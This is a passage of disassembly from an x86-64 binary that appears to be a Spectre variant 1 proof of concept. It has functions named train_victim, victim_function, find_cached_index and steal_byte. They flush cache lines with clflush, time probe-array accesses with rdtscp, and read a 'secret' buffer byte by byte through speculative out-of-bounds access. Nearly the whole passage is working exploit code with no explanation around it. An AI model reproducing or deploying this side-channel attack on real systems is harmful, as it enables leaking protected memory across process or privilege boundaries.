 98e:	8b 45 e8             	mov    -0x18(%rbp),%eax
 991:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
 997:	83 c0 0d             	add    $0xd,%eax
 99a:	25 ff 00 00 00       	and    $0xff,%eax
 99f:	89 45 ec             	mov    %eax,-0x14(%rbp)
 9a2:	8b 45 ec             	mov    -0x14(%rbp),%eax
 9a5:	c1 e0 0c             	shl    $0xc,%eax
 9a8:	48 63 d0             	movslq %eax,%rdx
 9ab:	48 8d 05 8e 18 20 00 	lea    0x20188e(%rip),%rax        # 202240 <array>
 9b2:	48 01 d0             	add    %rdx,%rax
 9b5:	48 89 c3             	mov    %rax,%rbx
 9b8:	0f ae f0             	mfence 
 9bb:	0f 01 f9             	rdtscp 
 9be:	49 89 c2             	mov    %rax,%r10
 9c1:	48 8b 0b             	mov    (%rbx),%rcx
 9c4:	0f 01 f9             	rdtscp 
 9c7:	4c 29 d0             	sub    %r10,%rax
 9ca:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 9ce:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 9d3:	77 28                	ja     9fd <find_cached_index+0x90>
 9d5:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
 9d9:	74 22                	je     9fd <find_cached_index+0x90>
 9db:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%rbp)
 9e2:	8b 45 ec             	mov    -0x14(%rbp),%eax
 9e5:	48 98                	cltq   
 9e7:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 9ee:	00 
 9ef:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
 9f3:	48 01 d0             	add    %rdx,%rax
 9f6:	8b 10                	mov    (%rax),%edx
 9f8:	83 c2 01             	add    $0x1,%edx
 9fb:	89 10                	mov    %edx,(%rax)
 9fd:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 a01:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 a08:	0f 8e 78 ff ff ff    	jle    986 <find_cached_index+0x19>
 a0e:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 a11:	5b                   	pop    %rbx
 a12:	5d                   	pop    %rbp
 a13:	c3                   	retq   

0000000000000a14 <find_highest_score>:
 a14:	55                   	push   %rbp
 a15:	48 89 e5             	mov    %rsp,%rbp
 a18:	48 83 ec 20          	sub    $0x20,%rsp
 a1c:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 a20:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 a27:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 a2e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 a35:	eb 3e                	jmp    a75 <find_highest_score+0x61>
 a37:	8b 45 fc             	mov    -0x4(%rbp),%eax
 a3a:	48 98                	cltq   
 a3c:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a43:	00 
 a44:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 a48:	48 01 d0             	add    %rdx,%rax
 a4b:	8b 00                	mov    (%rax),%eax
 a4d:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 a50:	7d 1f                	jge    a71 <find_highest_score+0x5d>
 a52:	8b 45 fc             	mov    -0x4(%rbp),%eax
 a55:	89 45 f8             	mov    %eax,-0x8(%rbp)
 a58:	8b 45 fc             	mov    -0x4(%rbp),%eax
 a5b:	48 98                	cltq   
 a5d:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a64:	00 
 a65:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 a69:	48 01 d0             	add    %rdx,%rax
 a6c:	8b 00                	mov    (%rax),%eax
 a6e:	89 45 f4             	mov    %eax,-0xc(%rbp)
 a71:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 a75:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 a7c:	7e b9                	jle    a37 <find_highest_score+0x23>
 a7e:	8b 35 bc 16 20 00    	mov    0x2016bc(%rip),%esi        # 202140 <try>
 a84:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 a87:	8b 55 f8             	mov    -0x8(%rbp),%edx
 a8a:	8b 45 f8             	mov    -0x8(%rbp),%eax
 a8d:	41 89 f0             	mov    %esi,%r8d
 a90:	89 c6                	mov    %eax,%esi
 a92:	48 8d 3d ef 02 00 00 	lea    0x2ef(%rip),%rdi        # d88 <_IO_stdin_used+0x8>
 a99:	b8 00 00 00 00       	mov    $0x0,%eax
 a9e:	e8 6d fc ff ff       	callq  710 <printf@plt>
 aa3:	90                   	nop
 aa4:	c9                   	leaveq 
 aa5:	c3                   	retq   

0000000000000aa6 <train_victim>:
 aa6:	55                   	push   %rbp
 aa7:	48 89 e5             	mov    %rsp,%rbp
 aaa:	48 83 ec 10          	sub    $0x10,%rsp
 aae:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 ab5:	eb 6b                	jmp    b22 <train_victim+0x7c>
 ab7:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 aba:	ba 67 66 66 66       	mov    $0x66666667,%edx
 abf:	89 c8                	mov    %ecx,%eax
 ac1:	f7 ea                	imul   %edx
 ac3:	c1 fa 02             	sar    $0x2,%edx
 ac6:	89 c8                	mov    %ecx,%eax
 ac8:	c1 f8 1f             	sar    $0x1f,%eax
 acb:	29 c2                	sub    %eax,%edx
 acd:	89 d0                	mov    %edx,%eax
 acf:	c1 e0 02             	shl    $0x2,%eax
 ad2:	01 d0                	add    %edx,%eax
 ad4:	01 c0                	add    %eax,%eax
 ad6:	29 c1                	sub    %eax,%ecx
 ad8:	89 ca                	mov    %ecx,%edx
 ada:	48 63 c2             	movslq %edx,%rax
 add:	48 89 c7             	mov    %rax,%rdi
 ae0:	e8 95 fd ff ff       	callq  87a <victim_function>
 ae5:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 aec:	eb 1a                	jmp    b08 <train_victim+0x62>
 aee:	8b 45 f8             	mov    -0x8(%rbp),%eax
 af1:	c1 e0 0c             	shl    $0xc,%eax
 af4:	48 63 d0             	movslq %eax,%rdx
 af7:	48 8d 05 42 17 20 00 	lea    0x201742(%rip),%rax        # 202240 <array>
 afe:	48 01 d0             	add    %rdx,%rax
 b01:	0f ae 38             	clflush (%rax)
 b04:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 b08:	81 7d f8 ff 00 00 00 	cmpl   $0xff,-0x8(%rbp)
 b0f:	7e dd                	jle    aee <train_victim+0x48>
 b11:	0f ae f0             	mfence 
 b14:	48 8d 05 05 15 20 00 	lea    0x201505(%rip),%rax        # 202020 <bufferSize>
 b1b:	0f ae 38             	clflush (%rax)
 b1e:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
 b22:	83 7d f4 1d          	cmpl   $0x1d,-0xc(%rbp)
 b26:	7e 8f                	jle    ab7 <train_victim+0x11>
 b28:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 b2f:	eb 1a                	jmp    b4b <train_victim+0xa5>
 b31:	8b 45 fc             	mov    -0x4(%rbp),%eax
 b34:	c1 e0 0c             	shl    $0xc,%eax
 b37:	48 63 d0             	movslq %eax,%rdx
 b3a:	48 8d 05 ff 16 20 00 	lea    0x2016ff(%rip),%rax        # 202240 <array>
 b41:	48 01 d0             	add    %rdx,%rax
 b44:	0f ae 38             	clflush (%rax)
 b47:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 b4b:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 b52:	7e dd                	jle    b31 <train_victim+0x8b>
 b54:	0f ae f0             	mfence 
 b57:	48 8d 05 c2 14 20 00 	lea    0x2014c2(%rip),%rax        # 202020 <bufferSize>
 b5e:	0f ae 38             	clflush (%rax)
 b61:	90                   	nop
 b62:	c9                   	leaveq 
 b63:	c3                   	retq   

0000000000000b64 <steal_byte>:
 b64:	55                   	push   %rbp
 b65:	48 89 e5             	mov    %rsp,%rbp
 b68:	48 83 ec 20          	sub    $0x20,%rsp
 b6c:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 b70:	89 75 e4             	mov    %esi,-0x1c(%rbp)
 b73:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 b7a:	eb 4e                	jmp    bca <steal_byte+0x66>
 b7c:	b8 00 00 00 00       	mov    $0x0,%eax
 b81:	e8 20 ff ff ff       	callq  aa6 <train_victim>
 b86:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 b89:	48 98                	cltq   
 b8b:	48 89 c7             	mov    %rax,%rdi
 b8e:	e8 e7 fc ff ff       	callq  87a <victim_function>
 b93:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 b97:	48 89 c7             	mov    %rax,%rdi
 b9a:	e8 ce fd ff ff       	callq  96d <find_cached_index>
 b9f:	89 45 fc             	mov    %eax,-0x4(%rbp)
 ba2:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
 ba6:	75 13                	jne    bbb <steal_byte+0x57>
 ba8:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
 bac:	8b 05 8e 15 20 00    	mov    0x20158e(%rip),%eax        # 202140 <try>
 bb2:	83 c0 01             	add    $0x1,%eax
 bb5:	89 05 85 15 20 00    	mov    %eax,0x201585(%rip)        # 202140 <try>
 bbb:	8b 05 7f 15 20 00    	mov    0x20157f(%rip),%eax        # 202140 <try>
 bc1:	83 f8 0a             	cmp    $0xa,%eax
 bc4:	74 0c                	je     bd2 <steal_byte+0x6e>
 bc6:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 bca:	83 7d f8 09          	cmpl   $0x9,-0x8(%rbp)
 bce:	7e ac                	jle    b7c <steal_byte+0x18>
 bd0:	eb 01                	jmp    bd3 <steal_byte+0x6f>
 bd2:	90                   	nop
 bd3:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 bd7:	48 89 c7             	mov    %rax,%rdi
 bda:	e8 35 fe ff ff       	callq  a14 <find_highest_score>
 bdf:	c7 05 57 15 20 00 00 	movl   $0x0,0x201557(%rip)        # 202140 <try>
 be6:	00 00 00 
 be9:	90                   	nop
 bea:	c9                   	leaveq 
 beb:	c3                   	retq   

0000000000000bec <main>:
 bec:	55                   	push   %rbp
 bed:	48 89 e5             	mov    %rsp,%rbp
 bf0:	48 83 ec 20          	sub    $0x20,%rsp
 bf4:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 bfb:	eb 24                	jmp    c21 <main+0x35>
 bfd:	8b 45 e0             	mov    -0x20(%rbp),%eax
 c00:	99                   	cltd   
 c01:	c1 ea 18             	shr    $0x18,%edx
 c04:	01 d0                	add    %edx,%eax
 c06:	0f b6 c0             	movzbl %al,%eax
 c09:	29 d0                	sub    %edx,%eax
 c0b:	89 c1                	mov    %eax,%ecx
 c0d:	8b 45 e0             	mov    -0x20(%rbp),%eax
 c10:	48 63 d0             	movslq %eax,%rdx
 c13:	48 8d 05 26 16 20 00 	lea    0x201626(%rip),%rax        # 202240 <array>
 c1a:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 c1d:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 c21:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 c28:	7e d3                	jle    bfd <main+0x11>
 c2a:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 c31:	e9 b1 00 00 00       	jmpq   ce7 <main+0xfb>
 c36:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 c3d:	eb 1a                	jmp    c59 <main+0x6d>
 c3f:	8b 45 e8             	mov    -0x18(%rbp),%eax
 c42:	c1 e0 0c             	shl    $0xc,%eax
 c45:	48 63 d0             	movslq %eax,%rdx
 c48:	48 8d 05 f1 15 20 00 	lea    0x2015f1(%rip),%rax        # 202240 <array>
 c4f:	48 01 d0             	add    %rdx,%rax
 c52:	0f ae 38             	clflush (%rax)
 c55:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 c59:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 c60:	7e dd                	jle    c3f <main+0x53>
 c62:	0f ae f0             	mfence 
 c65:	bf 00 04 00 00       	mov    $0x400,%edi
 c6a:	e8 c1 fa ff ff       	callq  730 <malloc@plt>
 c6f:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 c73:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 c7a:	eb 1e                	jmp    c9a <main+0xae>
 c7c:	8b 45 ec             	mov    -0x14(%rbp),%eax
 c7f:	48 98                	cltq   
 c81:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 c88:	00 
 c89:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 c8d:	48 01 d0             	add    %rdx,%rax
 c90:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 c96:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 c9a:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 ca1:	7e d9                	jle    c7c <main+0x90>
 ca3:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 ca6:	48 98                	cltq   
 ca8:	48 8d 0d 31 14 20 00 	lea    0x201431(%rip),%rcx        # 2020e0 <secret>
 caf:	48 8d 15 8a 13 20 00 	lea    0x20138a(%rip),%rdx        # 202040 <buffer>
 cb6:	48 29 d1             	sub    %rdx,%rcx
 cb9:	48 89 ca             	mov    %rcx,%rdx
 cbc:	48 01 d0             	add    %rdx,%rax
 cbf:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 cc3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 cc7:	89 c2                	mov    %eax,%edx
 cc9:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 ccd:	89 d6                	mov    %edx,%esi
 ccf:	48 89 c7             	mov    %rax,%rdi
 cd2:	e8 8d fe ff ff       	callq  b64 <steal_byte>
 cd7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 cdb:	48 89 c7             	mov    %rax,%rdi
 cde:	e8 0d fa ff ff       	callq  6f0 <free@plt>
 ce3:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 ce7:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 ceb:	0f 8e 45 ff ff ff    	jle    c36 <main+0x4a>
 cf1:	b8 00 00 00 00       	mov    $0x0,%eax
 cf6:	c9                   	leaveq 
 cf7:	c3                   	retq   
 cf8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 cff:	00 

0000000000000d00 <__libc_csu_init>:
 d00:	41 57                	push   %r15
 d02:	41 56                	push   %r14
 d04:	49 89 d7             	mov    %rdx,%r15
 d07:	41 55                	push   %r13
 d09:	41 54                	push   %r12
 d0b:	4c 8d 25 6e 10 20 00 	lea    0x20106e(%rip),%r12        # 201d80 <__frame_dummy_init_array_entry>
 d12:	55                   	push   %rbp
 d13:	48 8d 2d 6e 10 20 00 	lea    0x20106e(%rip),%rbp        # 201d88 <__init_array_end>
 d1a:	53                   	push   %rbx
 d1b:	41 89 fd             	mov    %edi,%r13d
 d1e:	49 89 f6             	mov    %rsi,%r14
 d21:	4c 29 e5             	sub    %r12,%rbp
 d24:	48 83 ec 08          	sub    $0x8,%rsp
 d28:	48 c1 fd 03          	sar    $0x3,%rbp
 d2c:	e8 7f f9 ff ff       	callq  6b0 <_init>
 d31:	48 85 ed             	test   %rbp,%rbp
 d34:	74 20                	je     d56 <__libc_csu_init+0x56>
 d36:	31 db                	xor    %ebx,%ebx
 d38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 d3f:	00 
 d40:	4c 89 fa             	mov    %r15,%rdx
 d43:	4c 89 f6             	mov    %r14,%rsi
 d46:	44 89 ef             	mov    %r13d,%edi
 d49:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 d4d:	48 83 c3 01          	add    $0x1,%rbx
 d51:	48 39 dd             	cmp    %rbx,%rbp
 d54:	75 ea                	jne    d40 <__libc_csu_init+0x40>
 d56:	48 83 c4 08          	add    $0x8,%rsp
 d5a:	5b                   	pop    %rbx
 d5b:	5d                   	pop    %rbp
 d5c:	41 5c                	pop    %r12
 d5e:	41 5d                	pop    %r13
 d60:	41 5e                	pop    %r14
 d62:	41 5f                	pop    %r15
 d64:	c3                   	retq   
 d65:	90                   	nop
 d66:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 d6d:	00 00 00 

0000000000000d70 <__libc_csu_fini>:
 d70:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000d74 <_fini>:
 d74:	48 83 ec 08          	sub    $0x8,%rsp
 d78:	48 83 c4 08          	add    $0x8,%rsp
 d7c:	c3                   	retq   

Disassembly of section .rodata:

0000000000000d80 <_IO_stdin_used>:
 d80:	01 00                	add    %eax,(%rax)
 d82:	02 00                	add    (%rax),%al
 d84:	00 00                	add    %al,(%rax)
 d86:	00 00                	add    %al,(%rax)
 d88:	4c                   	rex.WR
 d89:	65 74 74             	gs je  e00 <__GNU_EH_FRAME_HDR+0x4c>
 d8c:	65 72 3a             	gs jb  dc9 <__GNU_EH_FRAME_HDR+0x15>
 d8f:	20 25 63 09 20 49    	and    %ah,0x49200963(%rip)        # 492016f8 <_end+0x48eff3f8>
 d95:	6e                   	outsb  %ds:(%rsi),(%dx)
 d96:	64 65 78 3a          	fs gs js dd4 <__GNU_EH_FRAME_HDR+0x20>
 d9a:	20 25 64 09 20 48    	and    %ah,0x48200964(%rip)        # 48201704 <_end+0x47eff404>
 da0:	69 74 73 3a 25 64 20 	imul   $0x9206425,0x3a(%rbx,%rsi,2),%esi
 da7:	09 
 da8:	20 54 72 69          	and    %dl,0x69(%rdx,%rsi,2)
 dac:	65 73 3a             	gs jae de9 <__GNU_EH_FRAME_HDR+0x35>
 daf:	25                   	.byte 0x25
 db0:	64 0a 00             	or     %fs:(%rax),%al

Disassembly of section .eh_frame_hdr:

0000000000000db4 <__GNU_EH_FRAME_HDR>:
 db4:	01 1b                	add    %ebx,(%rbx)
 db6:	03 3b                	add    (%rbx),%edi
 db8:	70 00                	jo     dba <__GNU_EH_FRAME_HDR+0x6>
 dba:	00 00                	add    %al,(%rax)
 dbc:	0d 00 00 00 1c       	or     $0x1c000000,%eax
 dc1:	f9                   	stc    
 dc2:	ff                   	(bad)  
 dc3:	ff                   	(bad)  
 dc4:	bc 00 00 00 ac       	mov    $0xac000000,%esp
 dc9:	f9                   	stc    
 dca:	ff                   	(bad)  
 dcb:	ff e4                	jmpq   *%rsp
 dcd:	00 00                	add    %al,(%rax)
 dcf:	00 bc f9 ff ff 8c 00 	add    %bh,0x8cffff(%rcx,%rdi,8)
 dd6:	00 00                	add    %al,(%rax)
 dd8:	c6                   	(bad)  
 dd9:	fa                   	cli    
 dda:	ff                   	(bad)  
 ddb:	ff                   	(bad)  
 ddc:	fc                   	cld    
 ddd:	00 00                	add    %al,(%rax)
 ddf:	00 13                	add    %dl,(%rbx)
 de1:	fb                   	sti    
 de2:	ff                   	(bad)  
 de3:	ff 1c 01             	lcall  *(%rcx,%rax,1)
 de6:	00 00                	add    %al,(%rax)
 de8:	89 fb                	mov    %edi,%ebx
 dea:	ff                   	(bad)  
 deb:	ff                   	(bad)  
 dec:	3c 01                	cmp    $0x1,%al
 dee:	00 00                	add    %al,(%rax)
 df0:	b9 fb ff ff 58       	mov    $0x58fffffb,%ecx
 df5:	01 00                	add    %eax,(%rax)
 df7:	00 60 fc             	add    %ah,-0x4(%rax)
 dfa:	ff                   	(bad)  
 dfb:	ff                   	(bad)  
 dfc:	7c 01                	jl     dff <__GNU_EH_FRAME_HDR+0x4b>
 dfe:	00 00                	add    %al,(%rax)
 e00:	f2 fc                	repnz cld 
 e02:	ff                   	(bad)  
 e03:	ff 9c 01 00 00 b0 fd 	lcall  *-0x2500000(%rcx,%rax,1)
 e0a:	ff                   	(bad)  
 e0b:	ff                   	(bad)  
 e0c:	bc 01 00 00 38       	mov    $0x38000001,%esp
 e11:	fe                   	(bad)  
 e12:	ff                   	(bad)  
 e13:	ff                   	(bad)  
 e14:	dc 01                	faddl  (%rcx)
 e16:	00 00                	add    %al,(%rax)
 e18:	4c ff                	rex.WR (bad) 
 e1a:	ff                   	(bad)  
 e1b:	ff                   	(bad)  
 e1c:	fc                   	cld    
 e1d:	01 00                	add    %eax,(%rax)
 e1f:	00 bc ff ff ff 44 02 	add    %bh,0x244ffff(%rdi,%rdi,8)
	...

Disassembly of section .eh_frame:

0000000000000e28 <__FRAME_END__-0x1e4>:
     e28:	14 00                	adc    $0x0,%al
     e2a:	00 00                	add    %al,(%rax)
     e2c:	00 00                	add    %al,(%rax)
     e2e:	00 00                	add    %al,(%rax)
     e30:	01 7a 52             	add    %edi,0x52(%rdx)
     e33:	00 01                	add    %al,(%rcx)
     e35:	78 10                	js     e47 <__GNU_EH_FRAME_HDR+0x93>
     e37:	01 1b                	add    %ebx,(%rbx)
     e39:	0c 07                	or     $0x7,%al
     e3b:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
     e41:	00 00                	add    %al,(%rax)
     e43:	00 1c 00             	add    %bl,(%rax,%rax,1)
     e46:	00 00                	add    %al,(%rax)
     e48:	28 f9                	sub    %bh,%cl
     e4a:	ff                   	(bad)  
     e4b:	ff 2b                	ljmp   *(%rbx)
	...
     e55:	00 00                	add    %al,(%rax)
     e57:	00 14 00             	add    %dl,(%rax,%rax,1)
     e5a:	00 00                	add    %al,(%rax)
     e5c:	00 00                	add    %al,(%rax)
     e5e:	00 00                	add    %al,(%rax)
     e60:	01 7a 52             	add    %edi,0x52(%rdx)
     e63:	00 01                	add    %al,(%rcx)
     e65:	78 10                	js     e77 <__GNU_EH_FRAME_HDR+0xc3>
     e67:	01 1b                	add    %ebx,(%rbx)
     e69:	0c 07                	or     $0x7,%al
     e6b:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
     e71:	00 00                	add    %al,(%rax)
     e73:	00 1c 00             	add    %bl,(%rax,%rax,1)
     e76:	00 00                	add    %al,(%rax)
     e78:	58                   	pop    %rax
     e79:	f8                   	clc    
     e7a:	ff                   	(bad)  
     e7b:	ff 90 00 00 00 00    	callq  *0x0(%rax)
     e81:	0e                   	(bad)  
     e82:	10 46 0e             	adc    %al,0xe(%rsi)
     e85:	18 4a 0f             	sbb    %cl,0xf(%rdx)
     e88:	0b 77 08             	or     0x8(%rdi),%esi
     e8b:	80 00 3f             	addb   $0x3f,(%rax)
     e8e:	1a 3b                	sbb    (%rbx),%bh
     e90:	2a 33                	sub    (%rbx),%dh
     e92:	24 22                	and    $0x22,%al
     e94:	00 00                	add    %al,(%rax)
     e96:	00 00                	add    %al,(%rax)
     e98:	14 00                	adc    $0x0,%al
     e9a:	00 00                	add    %al,(%rax)
     e9c:	44 00 00             	add    %r8b,(%rax)
     e9f:	00 c0                	add    %al,%al
     ea1:	f8                   	clc    
     ea2:	ff                   	(bad)  
     ea3:	ff 08                	decl   (%rax)
	...
     ead:	00 00                	add    %al,(%rax)
     eaf:	00 1c 00             	add    %bl,(%rax,%rax,1)
     eb2:	00 00                	add    %al,(%rax)
     eb4:	5c                   	pop    %rsp
     eb5:	00 00                	add    %al,(%rax)
     eb7:	00 c2                	add    %al,%dl
     eb9:	f9                   	stc    
     eba:	ff                   	(bad)  
     ebb:	ff 4d 00             	decl   0x0(%rbp)
     ebe:	00 00                	add    %al,(%rax)
     ec0:	00 41 0e             	add    %al,0xe(%rcx)
     ec3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
     ec9:	02 48 0c             	add    0xc(%rax),%cl
     ecc:	07                   	(bad)  
     ecd:	08 00                	or     %al,(%rax)
     ecf:	00 1c 00             	add    %bl,(%rax,%rax,1)
     ed2:	00 00                	add    %al,(%rax)
     ed4:	7c 00                	jl     ed6 <__GNU_EH_FRAME_HDR+0x122>
     ed6:	00 00                	add    %al,(%rax)
     ed8:	ef                   	out    %eax,(%dx)
     ed9:	f9                   	stc    
     eda:	ff                   	(bad)  
     edb:	ff 76 00             	pushq  0x0(%rsi)
     ede:	00 00                	add    %al,(%rax)
     ee0:	00 41 0e             	add    %al,0xe(%rcx)
     ee3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
     ee9:	02 71 0c             	add    0xc(%rcx),%dh
     eec:	07                   	(bad)  
     eed:	08 00                	or     %al,(%rax)
     eef:	00 18                	add    %bl,(%rax)
     ef1:	00 00                	add    %al,(%rax)
     ef3:	00 9c 00 00 00 45 fa 	add    %bl,-0x5bb0000(%rax,%rax,1)
     efa:	ff                   	(bad)  
     efb:	ff 30                	pushq  (%rax)
     efd:	00 00                	add    %al,(%rax)
     eff:	00 00                	add    %al,(%rax)
     f01:	41 0e                	rex.B (bad) 
     f03:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
     f09:	00 00                	add    %al,(%rax)
     f0b:	00 20                	add    %ah,(%rax)
     f0d:	00 00                	add    %al,(%rax)
     f0f:	00 b8 00 00 00 59    	add    %bh,0x59000000(%rax)
     f15:	fa                   	cli    
     f16:	ff                   	(bad)  
     f17:	ff a7 00 00 00 00    	jmpq   *0x0(%rdi)
     f1d:	41 0e                	rex.B (bad) 
     f1f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
     f25:	41 83 03 02          	addl   $0x2,(%r11)
     f29:	a1 0c 07 08 00 00 00 	movabs 0x1c00000008070c,%eax
     f30:	1c 00 
     f32:	00 00                	add    %al,(%rax)
     f34:	dc 00                	faddl  (%rax)
     f36:	00 00                	add    %al,(%rax)
     f38:	dc fa                	fdivr  %st,%st(2)
     f3a:	ff                   	(bad)  
     f3b:	ff 92 00 00 00 00    	callq  *0x0(%rdx)
     f41:	41 0e                	rex.B (bad) 
     f43:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
     f49:	02 8d 0c 07 08 00    	add    0x8070c(%rbp),%cl
     f4f:	00 1c 00             	add    %bl,(%rax,%rax,1)
     f52:	00 00                	add    %al,(%rax)
     f54:	fc                   	cld    
     f55:	00 00                	add    %al,(%rax)
     f57:	00 4e fb             	add    %cl,-0x5(%rsi)
     f5a:	ff                   	(bad)  
     f5b:	ff                   	(bad)  
     f5c:	be 00 00 00 00       	mov    $0x0,%esi
     f61:	41 0e                	rex.B (bad) 
     f63:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
     f69:	02 b9 0c 07 08 00    	add    0x8070c(%rcx),%bh
     f6f:	00 1c 00             	add    %bl,(%rax,%rax,1)
     f72:	00 00                	add    %al,(%rax)
     f74:	1c 01                	sbb    $0x1,%al
     f76:	00 00                	add    %al,(%rax)
     f78:	ec                   	in     (%dx),%al
     f79:	fb                   	sti    
     f7a:	ff                   	(bad)  
     f7b:	ff 88 00 00 00 00    	decl   0x0(%rax)
     f81:	41 0e                	rex.B (bad) 
     f83:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
     f89:	02 83 0c 07 08 00    	add    0x8070c(%rbx),%al
     f8f:	00 1c 00             	add    %bl,(%rax,%rax,1)
     f92:	00 00                	add    %al,(%rax)
     f94:	3c 01                	cmp    $0x1,%al
     f96:	00 00                	add    %al,(%rax)
     f98:	54                   	push   %rsp
     f99:	fc                   	cld    
     f9a:	ff                   	(bad)  
     f9b:	ff 0c 01             	decl   (%rcx,%rax,1)
     f9e:	00 00                	add    %al,(%rax)
     fa0:	00 41 0e             	add    %al,0xe(%rcx)
     fa3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
     fa9:	03 07                	add    (%rdi),%eax
     fab:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
     fae:	08 00                	or     %al,(%rax)
     fb0:	44 00 00             	add    %r8b,(%rax)
     fb3:	00 5c 01 00          	add    %bl,0x0(%rcx,%rax,1)
     fb7:	00 48 fd             	add    %cl,-0x3(%rax)
     fba:	ff                   	(bad)  
     fbb:	ff 65 00             	jmpq   *0x0(%rbp)
     fbe:	00 00                	add    %al,(%rax)
     fc0:	00 42 0e             	add    %al,0xe(%rdx)
     fc3:	10 8f 02 42 0e 18    	adc    %cl,0x180e4202(%rdi)
     fc9:	8e 03                	mov    (%rbx),%es
     fcb:	45 0e                	rex.RB (bad) 
     fcd:	20 8d 04 42 0e 28    	and    %cl,0x280e4204(%rbp)
     fd3:	8c 05 48 0e 30 86    	mov    %es,-0x79cff1b8(%rip)        # ffffffff86301e21 <_end+0xffffffff85fffb21>
     fd9:	06                   	(bad)  
     fda:	48 0e                	rex.W (bad) 
     fdc:	38 83 07 4d 0e 40    	cmp    %al,0x400e4d07(%rbx)
     fe2:	72 0e                	jb     ff2 <__GNU_EH_FRAME_HDR+0x23e>
     fe4:	38 41 0e             	cmp    %al,0xe(%rcx)
     fe7:	30 41 0e             	xor    %al,0xe(%rcx)
     fea:	28 42 0e             	sub    %al,0xe(%rdx)
     fed:	20 42 0e             	and    %al,0xe(%rdx)
     ff0:	18 42 0e             	sbb    %al,0xe(%rdx)
     ff3:	10 42 0e             	adc    %al,0xe(%rdx)
     ff6:	08 00                	or     %al,(%rax)
     ff8:	10 00                	adc    %al,(%rax)
     ffa:	00 00                	add    %al,(%rax)
     ffc:	a4                   	movsb  %ds:(%rsi),%es:(%rdi)
     ffd:	01 00                	add    %eax,(%rax)
     fff:	00 70 fd             	add    %dh,-0x3(%rax)
    1002:	ff                   	(bad)  
    1003:	ff 02                	incl   (%rdx)
    1005:	00 00                	add    %al,(%rax)
    1007:	00 00                	add    %al,(%rax)
    1009:	00 00                	add    %al,(%rax)
	...

